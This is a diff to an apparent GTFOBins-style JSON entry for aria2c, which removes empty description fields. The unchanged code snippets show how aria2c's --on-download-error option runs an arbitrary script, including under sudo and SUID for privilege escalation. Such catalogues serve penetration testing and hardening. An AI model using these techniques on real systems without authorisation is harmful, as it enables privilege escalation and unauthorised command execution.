@@ -2,7 +2,7 @@
   "functions": {
     "command": [
       {
-        "description": "",
+        
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"
       },
       {
@@ -18,13 +18,13 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
       }
     ]
